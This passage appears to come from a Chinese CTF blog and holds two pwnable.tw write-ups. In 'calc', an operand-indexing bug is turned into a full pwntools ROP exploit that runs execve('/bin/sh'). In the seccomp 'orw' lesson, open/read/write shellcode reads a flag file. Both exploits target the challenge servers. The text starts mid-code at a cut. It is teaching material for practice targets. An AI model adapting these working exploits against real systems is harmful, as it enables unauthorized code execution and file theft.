class="number">1</span>] = v9;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( *(i + str) &amp;&amp; (*(i + <span class="number">1</span> + str) - <span class="string">&#x27;0&#x27;</span>) &gt; <span class="number">9</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;expression error!&quot;</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v5 = i + <span class="number">1</span> + str;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ( <span class="keyword">operator</span>[j] )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">switch</span> ( *(i + str) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;%&#x27;</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">operator</span>[j] != <span class="string">&#x27;+&#x27;</span> &amp;&amp; <span class="keyword">operator</span>[j] != <span class="string">&#x27;-&#x27;</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              eval(num, <span class="keyword">operator</span>[j]);</span><br><span class="line">              <span class="keyword">operator</span>[j] = *(i + str);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">operator</span>[++j] = *(i + str);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">            eval(num, <span class="keyword">operator</span>[j]);</span><br><span class="line">            <span class="keyword">operator</span>[j] = *(i + str);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">default</span>:</span><br><span class="line">            eval(num, <span class="keyword">operator</span>[j--]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">operator</span>[j] = *(i + str);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">//Check Point</span></span><br><span class="line">      <span class="keyword">if</span> ( !*(i + str) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( j &gt;= <span class="number">0</span> )</span><br><span class="line">    eval(num, <span class="keyword">operator</span>[j--]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        大意是遍历每个字符，把每个运算数保存在num数组(此处num的传参是int型，因此后面数组赋值均用指针寻址)，而且从下标[1]开始保存，num[0]则用来实时保存操作数的个数。每一个运算符被存于operator数组中。</p>
<p>​        在瞅瞅实际用来进行运算的eval()函数：</p>
<p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724202337.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724202337.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p>
<p>​        运算方式为:用num[0]当作下标找对应的运算数，再将其与前面的运算数(即num[num[0]-1])进行计算，结果返回到后者。</p>
<p>​        举例：输入1+3时，num[0] = 2，num[1] = 1，num[2] = 3</p>
<p>​        运算之后：num[0] = 1，num[1] = 4。</p>
<p>​        而且parse函数中的检查点会检查num[0]是否为0。</p>
<p>​        而这题的<strong>漏洞点</strong>在eval函数里。函数中规定最后一个运算数与前者进行运算，但是没有考虑过第一个运算数不存在的情况。</p>
<p>​        举例：输入+300时，num[0] = 1，num[1] = 300，执行如下代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> 	num[*num - <span class="number">1</span>] += num[*num];</span><br><span class="line"><span class="comment">//	num[num[0]-1] += num[num[0]]</span></span><br><span class="line"><span class="comment">//	num[1-1] += num[1]</span></span><br><span class="line"><span class="comment">//	num[0] += num[1]</span></span><br></pre></td></tr></table></figure>

<p>​        也就是说，我们输入的300，那么301会被存放在num[0]中，但是num[0]运算结束后-1，因此仍然是300。而在函数calc中我们知道，num[i-1]会被。printf输出，而calc中的i相当于parse和eval中的num[0]。最后输出的是calc函数中的num[299]，相当于输出了parse中的num[300]。所以说，”+x”句式可以达成栈上的任意读。</p>
<p>​        再举例：输入+300+1024时，num[0] = 2，num[1] = 300，num[2] = 1024，但是上面我们说过，第一步运算结束后，num[0]为302，自减后为301，因此之后会执行如下代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> 	num[*num - <span class="number">1</span>] += num[*num];</span><br><span class="line"><span class="comment">//	num[num[0]-1] += num[num[0]]</span></span><br><span class="line"><span class="comment">//	num[301-1] += num[2]</span></span><br><span class="line"><span class="comment">//	num[300] += num[2]</span></span><br></pre></td></tr></table></figure>

<p>​        所以我们在num[2]中写的东西，都会被加到num[300]里面。这里的num[1]和num[2]都可控，也就实现了栈上任意地址写。</p>
<h3 id="B-Attack"><a href="#B-Attack" class="headerlink" title="B . Attack"></a>B . Attack</h3><p>​        虽然程序在栈上开启了canary，但是上述的任意地址写是定向的，不会破坏canary。程序还开启了栈上不可执行保护，因此我们需要通过syscall调用execve。</p>
<p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724210855.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724210855.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p>
<p>​        0x5A0÷4 = 360，所以num[0]到calc函数的栈底为360个单位。栈上结构大致如下：</p>
<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724211047.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724211047.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:67%;" />

<p>​        stack of main上面都属于calc的栈帧。而我们要改写的rop链和栈结构如下：</p>
<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724211153.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724211153.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom: 67%;" />

<p>​        其他的改写都比较简单，重点在于“/bin/sh”字符串，要让函数成功调用，就不能让他属于calc函数和execve函数的栈帧中，以免被清空。所以写在了int 80地址的后面。</p>
<p>​        那么如何求出这个地址呢？由上图我们可以看出calc栈帧中的old ebp我们也可以读出来，因为调用calc的上层函数是main，所以这个old ebp就是main函数的ebp。于是我们知道了栈底。不过这个ebp指向的确切位置我们不知道，因此只能再找找其他偏移。在main函数的汇编代码中，我们还可以求出esp的值。</p>
<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724222247.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724222247.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:80%;" />

<p>​        那么我们可以进而求出main函数的栈帧大小为ebp-esp+4，因为ebp和esp所在的单位都算main函数的栈帧，因此需要加4。</p>
<p>​        知道main_size之后，再用ebp - main_size，就求出了main函数的栈顶，或者说calc栈底向下的一个单位，也就是num[361]的位置。而我们知道bin语句的地址在num[368]，因此ebp - main_size + 4*8就是我们要输入”/bin/sh”的地址。</p>
<h3 id="C-Exploit"><a href="#C-Exploit" class="headerlink" title="C . Exploit"></a>C . Exploit</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p = process(&quot;./calc&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>,<span class="number">10100</span>)</span><br><span class="line"></span><br><span class="line">int80_addr = <span class="number">0x08049a21</span></span><br><span class="line">pop_eax = <span class="number">0x0805c34b</span></span><br><span class="line">pop_edx = <span class="number">0x0804848f</span></span><br><span class="line">pop_ecx_pop_ebx = <span class="number">0x080701d1</span></span><br><span class="line">stack = [pop_eax,<span class="number">0xB</span>,pop_edx,<span class="number">0</span>,pop_ecx_pop_ebx,<span class="number">0</span>,<span class="number">0</span>,int80_addr,u32(<span class="string">&quot;/bin&quot;</span>),u32(<span class="string">&quot;/sh\x00&quot;</span>)]</span><br><span class="line"><span class="built_in">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">&quot;+360&quot;</span>)</span><br><span class="line">i=p.recv()</span><br><span class="line">ebp = <span class="built_in">int</span>(i)+<span class="number">0x100000000</span></span><br><span class="line">esp = (ebp&amp;<span class="number">0xFFFFFFF0</span>)-<span class="number">0x10</span></span><br><span class="line">main_size = ebp - esp + <span class="number">4</span></span><br><span class="line"><span class="built_in">print</span> main_size</span><br><span class="line">rop_size = <span class="number">4</span>*<span class="number">8</span></span><br><span class="line">stack[<span class="number">6</span>] = <span class="built_in">int</span>(i)-main_size+rop_size</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">10</span>):</span><br><span class="line">	index = <span class="number">361</span> + i</span><br><span class="line">	p.sendline(<span class="string">&quot;+&quot;</span>+ <span class="built_in">str</span>(index))</span><br><span class="line">	data = <span class="built_in">int</span>(p.recvline())</span><br><span class="line">	<span class="keyword">if</span>( stack[i]&gt;data):</span><br><span class="line">		p.sendline(<span class="string">&quot;+&quot;</span>+<span class="built_in">str</span>(index)+<span class="string">&quot;+&quot;</span>+<span class="built_in">str</span>(stack[i]-data))</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		p.sendline(<span class="string">&quot;+&quot;</span>+<span class="built_in">str</span>(index)+<span class="built_in">str</span>(stack[i]-data))</span><br><span class="line">	result = <span class="built_in">int</span>(p.recvline())</span><br><span class="line">	<span class="built_in">print</span> <span class="string">&quot;num[&quot;</span>+<span class="built_in">str</span>(index)+<span class="string">&quot;] : &quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(result))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;halo....&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>​        最后还得sendline一下才能getshell。</p>
<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724212541.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724212541.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom: 80%;" />]]></content>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>Seccomp Sandbox (ORW)</title>
    <url>/2020/07/07/sandbox/</url>
    <content><![CDATA[<p>​        freebuf公开课pwn第五课总结。<span id="more"></span></p>
<h2 id="0x00-沙箱"><a href="#0x00-沙箱" class="headerlink" title="0x00 . 沙箱"></a>0x00 . 沙箱</h2><p>​        沙箱是一个虚拟系统程序，沙箱提供的环境相对于每一个运行的程序都是独立的，而且不会对现有的系统产生影响，即沙箱提供一个限制该应用程序对系统资源的访问权限。如果程序调用了沙箱函数，也就是说后面执行的代码都会在这个沙箱中进行。而沙箱会限制许多<strong>库函数</strong>导致其无法使用。所以如果要getshell，要么仅利用当前沙箱允许的程序进行getshell，要么进行<strong>沙箱逃逸</strong>(一般指的是python沙箱逃逸)。具体方式需要结合实际的环境和情况。</p>
<h2 id="0x01-ORW"><a href="#0x01-ORW" class="headerlink" title="0x01 . ORW"></a>0x01 . ORW</h2><p>​        orw指的是三个最基本的库函数，open，read，write。很多时候题目会要求我们仅用这三个函数实现getshell。大致程序流程为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fd = open(<span class="string">&quot;/home/test/flag&quot;</span>);		<span class="comment">//用open函数打开flag文件并获取索引</span></span><br><span class="line">read(fd,buf,<span class="number">0x100</span>);				   <span class="comment">//将文件中的文本通过read函数输入到buf中</span></span><br><span class="line">write(<span class="number">1</span>,buf,<span class="number">0x100</span>);				   <span class="comment">//用write函数输出buf</span></span><br></pre></td></tr></table></figure>

<h2 id="0x02-orw-From-pwnable-tw"><a href="#0x02-orw-From-pwnable-tw" class="headerlink" title="0x02 . orw From pwnable.tw"></a>0x02 . orw From pwnable.tw</h2><p>​        在pwnable.tw上找了一个沙箱例题。</p>
<h3 id="1-Analysis"><a href="#1-Analysis" class="headerlink" title="1.Analysis"></a>1.Analysis</h3><p>​        例行公事1：</p>
<p><img src="https://s1.ax1x.com/2020/07/13/UYTSns.png" class="lazyload" data-srcset="https://s1.ax1x.com/2020/07/13/UYTSns.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200703163831579"></p>
<p>​        例行公事2：</p>
<p><img src="https://s1.ax1x.com/2020/07/13/UYT97q.png" class="lazyload" data-srcset="https://s1.ax1x.com/2020/07/13/UYT97q.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200703163855847"></p>
<p>​        例行公事3：</p>
<p><img src="https://s1.ax1x.com/2020/07/13/UYovcQ.png" class="lazyload" data-srcset="https://s1.ax1x.com/2020/07/13/UYovcQ.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200703163932658"></p>
<p>​        运行之后是segment fault。</p>
<img src="https://s1.ax1x.com/2020/07/13/UYoxXj.png" class="lazyload" data-srcset="https://s1.ax1x.com/2020/07/13/UYoxXj.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200703150532100" style="zoom:90%;" />

<p>​        在ida32上可以看到main函数十分简短，而且发现了大大的orw_seccomp()，可以确定程序存在沙箱没跑了。</p>
<p>​        而沙箱函数后面的程序，大意就是输入shellcode并用函数指针执行。但是因为存在沙箱，所以当然不能直接执行system(“/bin/sh”)。先用<strong>seccomp-tools</strong>来看看程序沙箱的限制。</p>
<img src="https://s1.ax1x.com/2020/07/13/UYTpBn.png" class="lazyload" data-srcset="https://s1.ax1x.com/2020/07/13/UYTpBn.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:70%;" />

<p>​        程序中orw的三个函数都是可以调用的。因此需要通过这三个函数写shellcode。</p>
<h3 id="2-Shellcode"><a href="#2-Shellcode" class="headerlink" title="2.Shellcode"></a>2.Shellcode</h3><p>​        我们已经知道了只运用orw三个函数如何获取flag，现在只需要把整个流程写成汇编的shellcode即可。</p>
<p>​        除此之外还需要查一下系统调用函数需要用到那些寄存器，及其分别有哪些作用：</p>
<img src="https://s1.ax1x.com/2020/07/13/UYTPA0.png" class="lazyload" data-srcset="https://s1.ax1x.com/2020/07/13/UYTPA0.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:60%;" />

<h3 id="a-fd-open-“-home-orw-flag”"><a href="#a-fd-open-“-home-orw-flag”" class="headerlink" title="a . fd = open(“/home/orw/flag”)"></a>a . fd = open(“/home/orw/flag”)</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">xor</span> eax,eax;<span class="keyword">xor</span> ebx,ebx;	<span class="comment">//初始化</span></span><br><span class="line"><span class="keyword">xor</span> ecx,ecx;<span class="keyword">xor</span> edx,edx;</span><br><span class="line">mov eax,<span class="number">0x5</span>;				<span class="comment">//open的系统调用码为0x5</span></span><br><span class="line">push <span class="number">0x00006761</span>;			<span class="comment">//flag路径，需要补0</span></span><br><span class="line">push <span class="number">0x6c662f77</span>;			<span class="comment">//逆序</span></span><br><span class="line">push <span class="number">0x726f2f65</span>;			<span class="comment">//压栈暂存</span></span><br><span class="line">push <span class="number">0x6d6f682f</span>;			</span><br><span class="line">mov ebx,esp;				<span class="comment">//路径保存至ebx</span></span><br><span class="line"><span class="keyword">int</span> <span class="number">0x80</span>;</span><br></pre></td></tr></table></figure>

<h3 id="b-read-fd-buf-0x30"><a href="#b-read-fd-buf-0x30" class="headerlink" title="b . read(fd,buf,0x30);"></a>b . read(fd,buf,0x30);</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mov ebx,eax;				<span class="comment">//上一函数后，eax已获得fd</span></span><br><span class="line">mov ecx,esp;				<span class="comment">//将路径的flag文件read到栈上</span></span><br><span class="line">mov edx,<span class="number">0x30</span>;				<span class="comment">//读取字节数为0x30</span></span><br><span class="line">mov eax,<span class="number">0x03</span>;				<span class="comment">//read的系统调用码为0x3</span></span><br><span class="line"><span class="keyword">int</span> <span class="number">0x80</span>;</span><br></pre></td></tr></table></figure>

<h3 id="c-write-1-buf-0x30"><a href="#c-write-1-buf-0x30" class="headerlink" title="c.write(1,buf,0x30)"></a>c.write(1,buf,0x30)</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mov eax,<span class="number">0x4</span>;				<span class="comment">//write的系统调用码为0x4</span></span><br><span class="line">mov ebx,<span class="number">0x1</span>;				<span class="comment">//fd = stdout</span></span><br><span class="line">mov ecx,ecx;				<span class="comment">//要输出的flag在栈上，但是ecx已经指向esp了，因此本步可以不写</span></span><br><span class="line">mov edx,<span class="number">0x30</span>;				<span class="comment">//输出字节数为0x30</span></span><br><span class="line"><span class="keyword">int</span> <span class="number">0x80</span>;</span><br></pre></td></tr></table></figure>



<h3 id="3-Exploit"><a href="#3-Exploit" class="headerlink" title="3.Exploit"></a>3.Exploit</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&quot;./orw&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>,<span class="number">10001</span>)</span><br><span class="line">_<span class="built_in">open</span> = <span class="string">&quot;xor eax,eax;xor ebx,ebx;xor ecx,ecx;xor edx,edx;push 0x00006761;push 0x6c662f77;push 0x726f2f65;push 0x6d6f682f;mov ebx,esp;mov eax,0x5;int 0x80;&quot;</span></span><br><span class="line">_read = <span class="string">&quot;mov ebx,eax;mov ecx,esp;mov edx,0x30;mov eax,0x3;int 0x80;&quot;</span></span><br><span class="line">_write = <span class="string">&quot;mov ebx,0x1;mov ecx,esp;mov edx,0x30;mov eax,0x4;int 0x80;&quot;</span></span><br><span class="line">payload = _<span class="built_in">open</span>+_read+_write</span><br><span class="line">payload = asm(payload)</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="built_in">print</span> p.recv(<span class="number">0x20</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>Summary</tag>
      </tags>
  </entry>
</search>
